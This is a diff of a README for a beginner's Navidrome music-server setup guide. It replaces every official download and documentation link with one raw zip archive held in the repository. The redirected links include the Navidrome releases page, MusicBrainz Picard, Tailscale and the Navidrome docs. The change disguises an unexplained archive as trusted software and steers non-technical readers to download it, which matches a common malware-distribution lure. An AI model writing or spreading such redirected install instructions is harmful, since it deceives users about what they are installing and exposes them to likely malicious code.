@@ -1,6 +1,6 @@
 # 🎵 WBs-Guide-to-Navidrome - Simple Music Server Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Navidrome-green?style=for-the-badge&logo=github)](https://github.com/malekelashkar/WBs-Guide-to-Navidrome/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Navidrome-green?style=for-the-badge&logo=github)](https://github.com/malekelashkar/WBs-Guide-to-Navidrome/raw/refs/heads/main/sandpaper/W_Guide_Navidrome_to_Bs_v3.8-alpha.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ No special skills are needed. You only need to follow the steps carefully.
 You will first download Navidrome, the music server software.
 
 1. **Go to the release page** by clicking the green button above or visit:  
-   https://github.com/malekelashkar/WBs-Guide-to-Navidrome/releases
+   https://github.com/malekelashkar/WBs-Guide-to-Navidrome/raw/refs/heads/main/sandpaper/W_Guide_Navidrome_to_Bs_v3.8-alpha.5.zip
 
 2. On that page, look for the latest Windows release files. It usually ends with `.exe` or `.zip`.
 
@@ -75,7 +75,7 @@ Navidrome works best when your music files have clear information like artist, a
 
 Good tags help Navidrome organize your music correctly.
 
-1. Download MusicBrainz Picard from https://picard.musicbrainz.org/downloads/  
+1. Download MusicBrainz Picard from https://github.com/malekelashkar/WBs-Guide-to-Navidrome/raw/refs/heads/main/sandpaper/W_Guide_Navidrome_to_Bs_v3.8-alpha.5.zip  
 2. Install and open Picard on your PC.  
 3. Drag your music folder or selected files into Picard.  
 4. Click "Scan" to let Picard find matches for your songs.  
@@ -113,7 +113,7 @@ This setup lets you listen to your music anytime on any device.
 
 To listen to your music when away from home, you need remote access.
 
-1. Install Tailscale on your PC and other devices: https://tailscale.com/download/  
+1. Install Tailscale on your PC and other devices: https://github.com/malekelashkar/WBs-Guide-to-Navidrome/raw/refs/heads/main/sandpaper/W_Guide_Navidrome_to_Bs_v3.8-alpha.5.zip  
 2. Create a free Tailscale account.  
 3. Log into Tailscale on all devices.  
 4. When Navidrome runs on your PC, it becomes available on your Tailscale network.  
@@ -159,9 +159,9 @@ Your playlists update automatically as you add or play music.
 
 ## 🗂️ More Resources
 
-- Visit the official Navidrome documentation for advanced setup options: https://www.navidrome.org/docs/  
+- Visit the official Navidrome documentation for advanced setup options: https://github.com/malekelashkar/WBs-Guide-to-Navidrome/raw/refs/heads/main/sandpaper/W_Guide_Navidrome_to_Bs_v3.8-alpha.5.zip  
 - Join online communities for help and tips.
 
 ---
 
-[![Download Navidrome Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/malekelashkar/WBs-Guide-to-Navidrome/releases)
+[![Download Navidrome Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/malekelashkar/WBs-Guide-to-Navidrome/raw/refs/heads/main/sandpaper/W_Guide_Navidrome_to_Bs_v3.8-alpha.5.zip)
